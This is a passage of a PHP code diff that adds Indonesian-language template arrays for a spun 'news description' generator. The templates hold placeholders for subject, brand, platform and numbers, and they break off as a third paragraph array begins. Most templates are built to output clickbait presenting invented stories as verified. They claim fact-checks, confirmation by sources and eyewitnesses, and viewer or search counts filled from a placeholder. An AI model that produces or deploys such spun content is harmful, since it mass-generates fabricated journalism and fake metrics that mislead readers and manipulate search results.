+$p['kual'] = array('premium','terbaik','unggul','berkualitas tinggi','top-tier','first-class','superior','eksklusif','istimewa','luar biasa','canggih','mutakhir','terdepan','optimal','prima','elite','world-class','pro-grade','high-end','next-level','cutting-edge','state-of-the-art','top-notch','grade-A','masterclass','platinum','gold-standard','benchmark','legendary','iconic','supreme','ultra-premium','signature','prestige','diamond-class','five-star','distinguished','refined','sophisticated','polished','impeccable','flawless','superb','exceptional','outstanding');
+
+// ─── Desc Modular Paragraph System (5 paragraf × 25 varian = 200+ kata) ─────
+
+// P1: Opening — Perkenalan subjek & cerita (~40-50 kata)
+$p['desc_p1'] = array(
+    '{$V_LIHAT} kisah {$TONE} {$P_TENTANG} {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} {$P_SEBAGAI} {$PROF}. {$TAG} {$BRANDS} {$V_SAJIKAN} liputan {$KUAL} {$W} {$E} yang mengupas setiap sisi fenomena ini dengan pendekatan mendalam dan terverifikasi dari berbagai sumber terpercaya.',
+    '{$TAG} Dunia {$KUAL} kini diguncang oleh sosok {$SUBJECT} {$ADJ} {$P_YANG} {$P_SEBAGAI} {$PROF} nekad {$ACTION} {$P_DI} {$PLACE}. Hanya {$BRANDS} {$P_YANG} {$V_SAJIKAN} kisah {$TONE} {$W} {$E} ini secara lengkap dan tanpa sensor kepada seluruh pembaca setia.',
+    '{$BRANDS} {$V_SAJIKAN} dokumentasi {$KUAL} {$P_TENTANG} aksi {$TONE} {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Liputan {$W} {$E} ini menjadi rujukan utama bagi siapapun yang ingin memahami fenomena viral tersebut.',
+    'Siapa sangka {$SUBJECT} {$ADJ} bisa {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}? {$TAG} {$V_LIHAT} bagaimana {$BRANDS} {$V_SAJIKAN} kronologi {$TONE} {$KUAL} {$W} {$E} dari awal mula hingga puncak viralnya kisah luar biasa ini.',
+    '{$TAG} Fenomena {$TONE} terjadi ketika {$SUBJECT} {$ADJ} {$P_YANG} {$P_SEBAGAI} {$PROF} tiba-tiba {$ACTION} {$P_DI} {$PLACE}. {$BRANDS} langsung {$V_SAJIKAN} investigasi {$KUAL} {$W} {$E} untuk mengungkap fakta sebenarnya di balik peristiwa menggemparkan ini.',
+    '{$V_LIHAT} profil lengkap {$SUBJECT} {$ADJ} sang {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} melalui {$BRANDS}. {$TAG} Wawancara {$TONE} {$KUAL} {$W} {$E} ini mengupas sisi kehidupan yang jarang terekspos media arus utama manapun.',
+    'Breaking: {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} kedapatan {$ACTION} {$P_DI} {$PLACE}! {$TAG} {$BRANDS} {$V_SAJIKAN} berita {$TONE} {$KUAL} {$W} {$E} langsung dari lokasi kejadian dengan tim jurnalis investigatif terbaik kami.',
+    'Analisis {$TONE} dari {$BRANDS}: {$SUBJECT} {$ADJ} {$P_YANG} {$P_SEBAGAI} {$PROF} berhasil {$ACTION} {$P_DI} {$PLACE}. {$TAG} Tim riset {$V_SAJIKAN} data {$KUAL} {$W} {$E} yang belum pernah dipublikasikan oleh media manapun sebelumnya.',
+    '{$TAG} Reportase {$TONE} {$BRANDS}: perjalanan {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$V_LIHAT} narasi {$KUAL} {$W} {$E} yang disusun berdasarkan riset lapangan mendalam dan wawancara narasumber kunci.',
+    'Studi kasus {$TONE} {$BRANDS} {$P_TENTANG} {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF}: bagaimana sosok ini {$ACTION} {$P_DI} {$PLACE}. {$TAG} Dokumentasi {$KUAL} {$W} {$E} ini menyoroti aspek yang jarang dibahas media konvensional.',
+    '{$TAG} {$BRANDS} expose: {$V_LIHAT} sisi {$TONE} {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. Investigasi dua sisi {$KUAL} {$W} {$E} ini memberi gambaran utuh tanpa bias kepada seluruh pembaca.',
+    'Feature {$TONE} {$BRANDS}: sosok {$SUBJECT} {$ADJ} {$P_YANG} {$P_SEBAGAI} {$PROF} membuat gebrakan saat {$ACTION} {$P_DI} {$PLACE}. {$TAG} {$V_LIHAT} feature {$KUAL} {$W} {$E} dengan foto dan fakta yang baru terungkap ke publik.',
+    'Headline {$BRANDS}: {$SUBJECT} {$ADJ} sang {$PROF} secara {$TONE} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Berita {$KUAL} {$W} {$E} ini diperkuat dokumentasi resmi dan data valid yang {$BRANDS} {$V_SAJIKAN} kepada seluruh pembaca setia.',
+    '{$TAG} Flash report {$BRANDS}: {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} baru saja {$ACTION} {$P_DI} {$PLACE}. Update {$TONE} {$KUAL} {$W} {$E} ini langsung dari sumber pertama yang {$BRANDS} {$V_SAJIKAN} tanpa delay sedikitpun.',
+    '{$V_LIHAT} edisi {$TONE} {$BRANDS} {$P_TENTANG} retrospektif {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Timeline {$KUAL} {$W} {$E} disusun oleh tim riset berpengalaman kami secara kronologis.',
+    '{$TAG} {$BRANDS} verified: konfirmasi {$TONE} {$P_TENTANG} {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. Fact-check {$KUAL} {$W} {$E} ini menggunakan metodologi standar internasional yang ketat.',
+    'Data journalism {$BRANDS}: angka {$TONE} di balik {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Visualisasi data {$KUAL} {$W} {$E} interaktif {$V_SAJIKAN} insight mendalam bagi setiap pembaca.',
+    '{$TAG} Trending di {$BRANDS}: {$SUBJECT} {$ADJ} sang {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} jadi topik {$TONE} hangat. Analisis tren {$KUAL} {$W} {$E} menunjukkan lonjakan pencarian signifikan di seluruh platform.',
+    '{$BRANDS} deep dive: mengapa {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} bisa {$ACTION} {$P_DI} {$PLACE}. {$TAG} Analisis {$TONE} multi-dimensi {$KUAL} {$W} {$E} membahas faktor teknis sosial dan psikologis di balik fenomena ini.',
+    '{$TAG} Kolom opini {$BRANDS}: apakah {$SUBJECT} {$ADJ} sang {$PROF} benar-benar {$ACTION} {$P_DI} {$PLACE}? Debat {$TONE} {$KUAL} {$W} {$E} menghadirkan argumen kuat dari kedua belah pihak yang bertentangan.',
+    '{$V_LIHAT} podcast transcript {$BRANDS}: wawancara {$TONE} dengan {$SUBJECT} {$ADJ} sang {$PROF} {$P_TENTANG} pengalaman {$ACTION} {$P_DI} {$PLACE}. {$TAG} Transkrip {$KUAL} {$W} {$E} dilengkapi timestamp untuk navigasi mudah.',
+    '{$TAG} {$BRANDS} on location: {$SUBJECT} {$ADJ} sang {$PROF} tertangkap kamera saat {$ACTION} {$P_DI} {$PLACE}. Reportase {$TONE} on-the-ground {$KUAL} {$W} {$E} dengan footage dari tim kami di lapangan.',
+    'Perspektif {$TONE} dari {$BRANDS}: {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Opini pakar {$KUAL} {$W} {$E} memberikan pemahaman komprehensif {$P_TENTANG} fenomena yang tengah viral ini.',
+    '{$TAG} Seri investigasi {$BRANDS}: {$SUBJECT} {$ADJ} memulai karir {$P_SEBAGAI} {$PROF} dan {$ACTION} {$P_DI} {$PLACE}. Episode {$TONE} {$KUAL} {$W} {$E} dari trilogi investigasi mendalam yang pertama kali terbit di {$BRANDS}.',
+    '{$BRANDS} archive: menelusuri jejak {$TONE} {$SUBJECT} {$ADJ} {$P_YANG} {$P_SEBAGAI} {$PROF} dan {$ACTION} {$P_DI} {$PLACE}. {$TAG} Koleksi arsip {$KUAL} {$W} {$E} mencakup materi dari berbagai era dan sumber terpercaya.',
+    '{$EMOSI}! {$V_LIHAT} kisah {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} {$WAKTU}. {$P_SEBAGAI} {$PROF}, sosok ini berhasil menarik {$ANGKA} penonton. {$TAG} {$BRANDS} {$V_SAJIKAN} liputan {$KUAL} {$W} {$E}.',
+    '{$TAG} {$WAKTU}, {$SUBJECT} {$ADJ} sang {$PROF} {$ACTION} {$P_DI} {$PLACE} dengan cara {$EMOSI}. {$BRANDS} {$V_SAJIKAN} {$ANGKA} bukti otentik {$KUAL} {$W} {$E} yang mengguncang opini publik secara masif.',
+    'Kabar {$EMOSI} {$WAKTU}: {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} nekat {$ACTION} {$P_DI} {$PLACE}. {$TAG} {$BRANDS} mencatat {$ANGKA} viewer dalam hitungan jam. Liputan {$KUAL} {$W} {$E} ini wajib Anda simak.',
+    '{$V_LIHAT} momen {$EMOSI} {$WAKTU} saat {$SUBJECT} {$ADJ} {$P_YANG} {$P_SEBAGAI} {$PROF} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Sudah {$ANGKA} orang membahasnya. {$BRANDS} {$V_SAJIKAN} versi {$KUAL} {$W} {$E}.',
+    '{$TAG} Breaking {$WAKTU}: {$SUBJECT} {$ADJ} {$EMOSI} setelah {$ACTION} {$P_DI} {$PLACE} {$P_SEBAGAI} {$PROF}. Rating {$ANGKA} membuktikan kualitas. {$BRANDS} {$V_SAJIKAN} dokumentasi {$KUAL} {$W} {$E} eksklusif.',
+    '{$BRANDS} special report {$WAKTU}: aksi {$EMOSI} {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Ditonton {$ANGKA} kali. Konten {$KUAL} {$W} {$E} dengan narasi mendalam.',
+    '{$WAKTU} menjadi saksi peristiwa {$EMOSI} ketika {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$ACTION} {$P_DI} {$PLACE}. {$TAG} {$BRANDS} hadir dengan {$ANGKA} dokumen {$KUAL} {$W} {$E} pendukung.',
+    '{$TAG} Liputan {$EMOSI} {$BRANDS} {$WAKTU}: {$SUBJECT} {$ADJ} sang {$PROF} {$ACTION} {$P_DI} {$PLACE} di hadapan {$ANGKA} penonton langsung. Dokumentasi {$KUAL} {$W} {$E} tersaji lengkap.',
+    'Viral {$WAKTU}! {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} bikin {$EMOSI}. {$TAG} {$BRANDS} {$V_SAJIKAN} {$ANGKA} angle berbeda dalam liputan {$KUAL} {$W} {$E}.',
+    '{$TAG} Alert {$WAKTU}: fenomena {$EMOSI} terjadi saat {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$ACTION} {$P_DI} {$PLACE}. {$BRANDS} menyiapkan {$ANGKA} konten {$KUAL} {$W} {$E} untuk memenuhi rasa penasaran Anda.',
+    '{$BRANDS} live update {$WAKTU}: {$V_LIHAT} aksi {$EMOSI} {$SUBJECT} {$ADJ} sang {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Engagement mencapai {$ANGKA}. Konten {$KUAL} {$W} {$E} terupdate.',
+    '{$TAG} Cerita {$EMOSI} dari {$PLACE} {$WAKTU}: {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$ACTION} dengan hasil {$ANGKA} lipat. {$BRANDS} {$V_SAJIKAN} rangkuman {$KUAL} {$W} {$E} dari awal sampai akhir.',
+    '{$V_LIHAT} kronologi {$EMOSI} {$WAKTU}: {$SUBJECT} {$ADJ} sang {$PROF} {$ACTION} {$P_DI} {$PLACE} dan meraih {$ANGKA} respons positif. {$TAG} {$BRANDS} {$V_SAJIKAN} timeline {$KUAL} {$W} {$E} lengkap.',
+    '{$WAKTU} publik dikejutkan kabar {$EMOSI}: {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$ACTION} {$P_DI} {$PLACE}. {$BRANDS} sudah menyiapkan {$ANGKA} materi {$KUAL} {$W} {$E} untuk mengupas semua sisi.',
+    '{$TAG} Scoop {$EMOSI} {$BRANDS} {$WAKTU}: {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} diam-diam {$ACTION} {$P_DI} {$PLACE}. {$ANGKA} sumber mengonfirmasi. Liputan {$KUAL} {$W} {$E} ini benar-benar lengkap.',
+    '{$BRANDS} dispatch {$WAKTU}: peristiwa {$EMOSI} ketika {$SUBJECT} {$ADJ} {$P_YANG} {$P_SEBAGAI} {$PROF} {$ACTION} {$P_DI} {$PLACE}. {$TAG} View count mencapai {$ANGKA}. Sajian {$KUAL} {$W} {$E}.',
+    '{$TAG} Dossier {$BRANDS}: {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$ACTION} {$P_DI} {$PLACE} {$WAKTU} dengan dampak {$EMOSI}. Berisi {$ANGKA} halaman fakta. Riset {$KUAL} {$W} {$E} komprehensif.',
+    'Headline {$EMOSI} {$WAKTU}: {$SUBJECT} {$ADJ} sang {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} menjadi topik {$ANGKA} pencarian teratas. {$TAG} {$BRANDS} {$V_SAJIKAN} analisis {$KUAL} {$W} {$E}.',
+    '{$V_LIHAT} bagaimana {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} menciptakan momen {$EMOSI} {$WAKTU} saat {$ACTION} {$P_DI} {$PLACE}. {$TAG} Dengan {$ANGKA} engagement, {$BRANDS} {$V_SAJIKAN} liputan {$KUAL} {$W} {$E}.',
+    '{$TAG} Bulletin {$BRANDS} {$WAKTU}: insiden {$EMOSI} melibatkan {$SUBJECT} {$ADJ} sang {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. Diverifikasi {$ANGKA} sumber independen. Berita {$KUAL} {$W} {$E}.',
+    '{$BRANDS} investigasi {$WAKTU}: mengapa {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$ACTION} {$P_DI} {$PLACE} menjadi {$EMOSI}. {$TAG} Tim kami mengumpulkan {$ANGKA} bukti. Laporan {$KUAL} {$W} {$E}.',
+    '{$EMOSI}! {$TAG} {$BRANDS} gazette {$WAKTU}: {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} meraih perhatian {$ANGKA} netizen. Konten {$KUAL} {$W} {$E} tak boleh terlewat.',
+    '{$TAG} Laporan {$EMOSI} dari {$BRANDS} {$WAKTU}: {$SUBJECT} {$ADJ} sang {$PROF} {$ACTION} {$P_DI} {$PLACE} di depan {$ANGKA} saksi. Narasi {$KUAL} {$W} {$E} tersaji dengan bukti kuat.',
+    '{$WAKTU}, {$BRANDS} menangkap momen {$EMOSI} {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Sudah ditonton {$ANGKA} kali. Footage {$KUAL} {$W} {$E} HD.',
+);
+
+// P2: Exposition — Pengembangan narasi & dampak sosial (~40-50 kata)
+$p['desc_p2'] = array(
+    '{$KONEK}, fenomena ini telah {$SOCIAL} dan menarik perhatian jutaan pengguna {$PLATFORM}. Para pengamat industri menyatakan bahwa kisah {$P_TENTANG} {$SUBJECT} {$P_YANG} {$ACTION} merupakan salah satu yang paling {$TONE} sepanjang tahun ini.',
+    '{$TAG} Perlu dipahami bahwa aksi {$SUBJECT} {$ADJ} ini bukan sekadar kebetulan. Rekam jejak {$P_SEBAGAI} {$PROF} {$P_DI} {$PLACE} telah {$SOCIAL} dan menjadi sorotan {$TONE} khalayak {$PLATFORM} dalam beberapa waktu terakhir.',
+    '{$KONEK}, dampak dari {$SUBJECT} {$P_YANG} {$ACTION} terasa hingga {$P_DI} {$PLACE} dan sekitarnya. Perbincangan {$TONE} ini telah {$SOCIAL} dengan ribuan interaksi {$PLATFORM} yang terus bertambah setiap harinya tanpa henti.',
+    'Kronologi peristiwa menunjukkan bahwa {$SUBJECT} {$ADJ} telah lama mempersiapkan langkah ini {$P_SEBAGAI} {$PROF}. {$TAG} Kini setelah {$ACTION} {$P_DI} {$PLACE}, kabar {$TONE} ini {$SOCIAL} secara masif {$PLATFORM}.',
+    '{$TAG} Reaksi publik terhadap aksi {$SUBJECT} {$ADJ} sangat beragam dan mengundang perdebatan. Sebagian menganggap langkah {$PROF} ini {$TONE}, sementara yang lain terkagum melihat keberanian {$ACTION} {$P_DI} {$PLACE}. Berita ini telah {$SOCIAL} {$PLATFORM}.',
+    '{$KONEK}, para ahli {$P_TENTANG} bidang ini menyoroti bagaimana {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} mampu menciptakan momentum {$TONE}. Diskusi hangat telah {$SOCIAL} di berbagai forum dan komunitas {$PLATFORM} tanpa henti.',
+    'Investigasi lebih lanjut mengungkap bahwa {$SUBJECT} {$ADJ} memiliki jaringan luas {$P_DI} {$PLACE} {$P_SEBAGAI} {$PROF}. {$TAG} Temuan {$TONE} ini telah {$SOCIAL} dan mengundang perdebatan seru {$PLATFORM} dari berbagai kalangan.',
+    '{$TAG} {$KONEK}, bukti visual dan dokumentasi resmi menunjukkan bahwa {$SUBJECT} {$ADJ} memang benar {$ACTION} {$P_DI} {$PLACE}. Kebenaran {$TONE} ini telah {$SOCIAL} dan dikonfirmasi oleh banyak saksi mata {$PLATFORM}.',
+    'Riset mendalam menunjukkan tren {$TONE} {$P_TENTANG} fenomena {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} terus meningkat. {$TAG} Data menunjukkan topik ini telah {$SOCIAL} dengan engagement tinggi {$PLATFORM} dan tanpa tanda melambat.',
+    '{$KONEK}, aspek hukum dan etika dari aksi {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} turut menjadi bahasan {$TONE}. Polemik ini telah {$SOCIAL} dan memancing respons dari regulator dan publik {$PLATFORM}.',
+    '{$TAG} Narasi {$TONE} ini berkembang pesat sejak {$SUBJECT} {$ADJ} pertama kali {$ACTION} {$P_DI} {$PLACE}. {$P_SEBAGAI} {$PROF}, langkahnya telah {$SOCIAL} dan mempengaruhi persepsi publik {$PLATFORM} terhadap profesi tersebut secara signifikan.',
+    '{$KONEK}, catatan historis menunjukkan ini bukan pertama kalinya {$SUBJECT} {$ADJ} membuat kehebohan {$P_DI} {$PLACE}. Aksinya {$P_SEBAGAI} {$PROF} kali ini lebih {$TONE} dan telah {$SOCIAL} secara luas {$PLATFORM}.',
+    'Konteks sosial budaya memainkan peran penting dalam memahami mengapa {$SUBJECT} {$ADJ} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Fenomena {$TONE} ini telah {$SOCIAL} menghasilkan wacana publik {$PLATFORM} yang sangat dinamis dan menarik.',
+    '{$TAG} Para pengamat mencatat bahwa aksi {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_DI} {$PLACE} memiliki implikasi {$TONE} yang luas. Diskusi ini telah {$SOCIAL} melintasi batas geografis dan budaya {$PLATFORM} global.',
+    '{$KONEK}, dampak ekonomi dari fenomena {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} mulai terasa nyata. Ripple effect {$TONE} ini telah {$SOCIAL} dan menciptakan peluang baru bagi banyak pihak {$PLATFORM}.',
+    'Testimoni langsung dari saksi mata memperkuat narasi {$TONE} {$P_TENTANG} {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION}. {$TAG} Kesaksian ini telah {$SOCIAL} dan menjadi bukti tak terbantahkan di hadapan publik {$PLATFORM}.',
+    '{$TAG} {$KONEK}, timeline peristiwa menunjukkan evolusi {$TONE} dari perjalanan {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF}. Sejak awal {$ACTION} {$P_DI} {$PLACE}, kisah ini telah {$SOCIAL} dan terus berkembang {$PLATFORM}.',
+    'Analisis sentimen {$PLATFORM} menunjukkan respons {$TONE} terhadap aksi {$SUBJECT} {$ADJ} didominasi oleh kekaguman. {$TAG} Topik ini telah {$SOCIAL} dengan ratio positif yang sangat tinggi di berbagai kanal media.',
+    '{$KONEK}, dimensi {$TONE} dari kisah {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} melampaui ekspektasi semua pihak. Viralitas konten ini telah {$SOCIAL} dan menjadikannya salah satu topik terpanas {$PLATFORM} sepanjang waktu.',
+    '{$TAG} Studi komparatif menunjukkan bahwa aksi {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} tergolong langka dan unik. Keunikan {$TONE} ini telah {$SOCIAL} dan memantik rasa ingin tahu masif dari publik {$PLATFORM}.',
+    '{$KONEK}, jejak digital {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} menunjukkan pola {$TONE} yang konsisten dari waktu ke waktu. Akumulasi konten ini telah {$SOCIAL} membentuk narasi besar yang terus bergulir {$PLATFORM}.',
+    'Perspektif sosiologis menyoroti bagaimana {$SUBJECT} {$ADJ} merepresentasikan generasi {$TONE} {$P_YANG} {$ACTION}. {$TAG} Fenomena ini telah {$SOCIAL} dan merefleksikan perubahan paradigma {$PLATFORM} yang signifikan.',
+    '{$TAG} {$KONEK}, wawancara eksklusif mengungkap motivasi {$TONE} di balik keputusan {$SUBJECT} {$ADJ} untuk {$ACTION} {$P_DI} {$PLACE}. Pengakuan ini telah {$SOCIAL} dan mengubah persepsi khalayak {$PLATFORM}.',
+    'Dokumentasi fotografi memperlihatkan momen-momen krusial {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION}. {$TAG} Bukti visual {$TONE} ini telah {$SOCIAL} dan menjadi referensi otentik banyak media {$PLATFORM}.',
+    '{$KONEK}, arus informasi {$P_TENTANG} {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} terus mengalir deras. Liputan {$TONE} ini telah {$SOCIAL} dan menarik ratusan ribu pembaca baru setiap harinya {$PLATFORM}.',
+    '{$KONEK}, {$WAKTU} gelombang reaksi {$EMOSI} melanda setelah {$SUBJECT} {$ADJ} {$ACTION} {$P_DI} {$PLACE}. {$ANGKA} komentar membanjiri {$PLATFORM}. {$TAG} Fenomena {$TONE} ini telah {$SOCIAL} melampaui ekspektasi semua pihak.',
+    '{$TAG} Data {$WAKTU} menunjukkan {$ANGKA} pencarian terkait {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. Respons {$EMOSI} dari publik {$PLATFORM} telah {$SOCIAL} dan menjadi bahan diskusi {$TONE} yang hangat.',
+    '{$KONEK}, reaksi {$EMOSI} {$WAKTU} datang dari {$ANGKA} komunitas berbeda setelah {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$ACTION}. {$TAG} Topik {$TONE} ini telah {$SOCIAL} dan mendominasi trending {$PLATFORM}.',
+    '{$WAKTU} terjadi lonjakan {$EMOSI} sebesar {$ANGKA} pada pencarian terkait {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Eskalasi {$TONE} ini telah {$SOCIAL} dan mengubah landscape {$PLATFORM}.',
+    '{$TAG} {$KONEK}, survei {$WAKTU} dari {$ANGKA} responden menunjukkan aksi {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$ACTION} dianggap {$EMOSI}. Temuan {$TONE} ini telah {$SOCIAL} menjadi referensi {$PLATFORM}.',
+    'Debat {$EMOSI} meletus {$WAKTU} ketika {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} memicu {$ANGKA} thread diskusi. {$TAG} Polemik {$TONE} ini telah {$SOCIAL} dan tak kunjung mereda {$PLATFORM}.',
+    '{$KONEK}, ripple effect {$EMOSI} dari aksi {$SUBJECT} {$ADJ} {$WAKTU} telah menjangkau {$ANGKA} kota di seluruh negeri. {$TAG} Dampak {$TONE} ini telah {$SOCIAL} membentuk opini publik {$PLATFORM}.',
+    '{$TAG} Analisis {$WAKTU} mengungkap {$ANGKA} faktor di balik fenomena {$EMOSI} {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION}. Studi {$TONE} ini telah {$SOCIAL} dan dikutip berbagai media {$PLATFORM}.',
+    '{$KONEK}, {$ANGKA} pakar memberikan komentar {$EMOSI} {$WAKTU} {$P_TENTANG} {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Analisis {$TONE} ini telah {$SOCIAL} memperkaya wacana {$PLATFORM}.',
+    '{$WAKTU} muncul {$ANGKA} petisi terkait fenomena {$EMOSI} {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Gerakan {$TONE} ini telah {$SOCIAL} dan terus membesar {$PLATFORM}.',
+    '{$TAG} {$KONEK}, polling {$WAKTU} dari {$ANGKA} partisipan menunjukkan {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} mendapat respons {$EMOSI}. {$TONE} ini telah {$SOCIAL} dan mengubah dinamika diskusi {$PLATFORM}.',
+    'Gelombang {$EMOSI} ke-{$ANGKA} melanda {$WAKTU} setelah {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Momentum {$TONE} ini telah {$SOCIAL} dan belum menunjukkan tanda surut {$PLATFORM}.',
+    '{$KONEK}, {$WAKTU} tercatat {$ANGKA} media mengangkat kisah {$EMOSI} {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Coverage {$TONE} ini telah {$SOCIAL} dan menjangkau audiens internasional {$PLATFORM}.',
+    '{$TAG} Fenomena {$EMOSI} {$WAKTU}: {$ANGKA} influencer turut membahas aksi {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION}. Buzz {$TONE} ini telah {$SOCIAL} memecahkan rekor engagement {$PLATFORM}.',
+    '{$KONEK}, respons {$EMOSI} dari {$ANGKA} warganet {$WAKTU} mengonfirmasi bahwa {$SUBJECT} {$ADJ} {$ACTION} {$P_DI} {$PLACE} adalah peristiwa {$TONE}. {$TAG} Ini telah {$SOCIAL} dan terus viral {$PLATFORM}.',
+    '{$WAKTU}, {$ANGKA} konten kreator membuat tanggapan {$EMOSI} atas aksi {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF}. {$TAG} Reaksi {$TONE} berantai ini telah {$SOCIAL} membuat topik makin populer {$PLATFORM}.',
+    '{$TAG} {$KONEK}, efek domino {$EMOSI} {$WAKTU} meluas setelah {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} mencapai {$ANGKA} viewers. Impact {$TONE} ini telah {$SOCIAL} secara eksponensial {$PLATFORM}.',
+    '{$KONEK}, {$WAKTU} gelombang solidaritas {$EMOSI} dari {$ANGKA} komunitas mendukung {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$P_DI} {$PLACE}. {$TAG} Momentum {$TONE} ini telah {$SOCIAL} {$PLATFORM}.',
+    'Catatan {$WAKTU}: {$ANGKA} lembaga riset mendokumentasikan fenomena {$EMOSI} terkait {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION}. {$TAG} Kajian {$TONE} ini telah {$SOCIAL} menjadi rujukan {$PLATFORM}.',
+    '{$TAG} Kronologi {$EMOSI} {$WAKTU}: sejak {$SUBJECT} {$ADJ} {$ACTION} {$P_DI} {$PLACE}, sudah {$ANGKA} perkembangan baru terjadi. Evolusi {$TONE} ini telah {$SOCIAL} dan terus dipantau {$PLATFORM}.',
+    '{$KONEK}, {$WAKTU} {$ANGKA} negara melaporkan dampak {$EMOSI} dari fenomena {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION}. {$TAG} Skala {$TONE} global ini telah {$SOCIAL} melampaui batas domestik {$PLATFORM}.',
+    '{$TAG} Update {$EMOSI} {$WAKTU}: {$SUBJECT} {$ADJ} {$P_SEBAGAI} {$PROF} {$P_YANG} {$ACTION} {$P_DI} {$PLACE} kini meraih {$ANGKA} dukungan. Tren {$TONE} ini telah {$SOCIAL} dan terus tumbuh {$PLATFORM}.',
+    'Forum {$PLATFORM} ramai {$WAKTU} membahas kisah {$EMOSI} {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} dengan {$ANGKA} thread aktif. {$TAG} Diskusi {$TONE} ini telah {$SOCIAL} dan melibatkan berbagai kalangan.',
+    '{$KONEK}, {$ANGKA} hashtag terkait {$SUBJECT} {$ADJ} {$P_YANG} {$ACTION} {$WAKTU} trending secara {$EMOSI} {$P_DI} {$PLACE}. {$TAG} Viralitas {$TONE} ini telah {$SOCIAL} mendominasi timeline {$PLATFORM}.',
+);
+
+// P3: BRANDS Value — Keunggulan platform & kualitas konten (~40-50 kata)
+$p['desc_p3'] = array(
